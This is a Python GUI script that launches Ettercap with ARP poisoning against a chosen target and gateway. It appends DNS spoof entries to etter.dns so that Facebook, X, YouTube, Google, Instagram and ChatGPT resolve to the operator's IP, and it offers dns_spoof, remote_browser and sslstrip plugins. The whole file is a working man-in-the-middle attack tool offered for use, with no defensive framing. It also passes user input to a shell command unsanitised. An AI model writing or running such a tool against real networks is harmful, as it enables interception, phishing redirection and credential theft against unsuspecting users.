import subprocess
import tkinter as tk
from tkinter import messagebox, ttk
import atexit

ETTER_DNS_PATH = "/usr/share/ettercap/etter.dns"
spoof_ip_global = ""

# Ghost domains
def build_spoof_list(ip):
    domains = [
        "facebook.com", "X.com", "youtube.com",
        "google.com", "instagram.com", "chatgpt.com"
    ]
    return [{ "domain": d, "ip": ip } for d in domains]

# Inject spoof entries
def inject_spoof_entries(ip):
    global spoof_ip_global
    spoof_ip_global = ip
    spoof_list = build_spoof_list(ip)
    try:
        with open(ETTER_DNS_PATH, "a") as f:
            for entry in spoof_list:
                f.write(f"{entry['domain']} A {entry['ip']}\n")
        output_text.insert(tk.END, "✅ Spoof entries injected.\n")
    except PermissionError:
        messagebox.showerror("Permission Denied", "Run this script with sudo to modify etter.dns.")
    except Exception as e:
        messagebox.showerror("Error", str(e))

# Cleanup on exit
def cleanup_etter_dns():
    if not spoof_ip_global:
        return
    try:
        with open(ETTER_DNS_PATH, "r") as f:
            lines = f.readlines()
        with open(ETTER_DNS_PATH, "w") as f:
            for line in lines:
                if not any(spoof_ip_global in line and domain in line for domain in [
                    "facebook.com", "X.com", "youtube.com", "google.com", "instagram.com", "chatgpt.com"
                ]):
                    f.write(line)
        print("💀 Spoof entries removed from etter.dns.")
    except Exception as e:
        print("❌ Cleanup error:", e)

atexit.register(cleanup_etter_dns)

# Launch Ettercap
def run_ettercap():
    target_ip = target_entry.get().strip()
    gateway_ip = gateway_entry.get().strip()
    redirect_ip = spoof_ip_entry.get().strip()
    interface = iface_var.get()
    plugin = plugin_var.get()

    if not target_ip or not gateway_ip or not redirect_ip:
        messagebox.showerror("Missing Info", "Please fill in all fields.")
        return

    inject_spoof_entries(redirect_ip)

    command = f"sudo ettercap -T -q -i {interface} -M arp:remote /{target_ip}// /{gateway_ip}// -P {plugin}"
    output_text.insert(tk.END, f"\n📡 Running:\n{command}\n")

    try:
        subprocess.run(command, shell=True)
        output_text.insert(tk.END, "✅ Ettercap executed.\n")
    except Exception as e:
        output_text.insert(tk.END, f"❌ Error: {e}\n")

# Glitch-style title reveal
def glitch_reveal(widget, text, delay=50):
    widget.config(text="")
    def reveal(i=0):
        if i < len(text):
            widget.config(text=widget.cget("text") + text[i])
            widget.after(delay, reveal, i+1)
    reveal()

# GUI setup
root = tk.Tk()
root.title("Ghost Optics: Ettercap Launcher")
root.geometry("600x500")
root.configure(bg="#1e1e1e")

title_label = tk.Label(root, fg="#0f0", bg="#1e1e1e", font=("Courier", 14))
title_label.pack(pady=5)
glitch_reveal(title_label, "Ghost Optics: DNS Spoof Launcher")

tk.Label(root, text="Target IP:", fg="white", bg="#1e1e1e").pack()
target_entry = tk.Entry(root, width=40)
target_entry.pack()

tk.Label(root, text="Gateway IP:", fg="white", bg="#1e1e1e").pack()
gateway_entry = tk.Entry(root, width=40)
gateway_entry.pack()

tk.Label(root, text="Spoof Redirect IP (your IP):", fg="white", bg="#1e1e1e").pack()
spoof_ip_entry = tk.Entry(root, width=40)
spoof_ip_entry.pack()

tk.Label(root, text="Interface:", fg="white", bg="#1e1e1e").pack()
iface_var = tk.StringVar(value="wlan0")
iface_dropdown = ttk.Combobox(root, textvariable=iface_var, values=["wlan0", "eth0", "lo"], state="readonly")
iface_dropdown.pack()

tk.Label(root, text="Plugin:", fg="white", bg="#1e1e1e").pack()
plugin_var = tk.StringVar(value="dns_spoof")
plugin_dropdown = ttk.Combobox(root, textvariable=plugin_var, values=["dns_spoof", "remote_browser", "sslstrip"], state="readonly")
plugin_dropdown.pack()

tk.Button(root, text="Launch Ettercap", command=run_ettercap, bg="#444", fg="white").pack(pady=10)

output_text = tk.Text(root, height=10, bg="#111", fg="#0f0")
output_text.pack(fill=tk.BOTH, expand=True)

root.mainloop()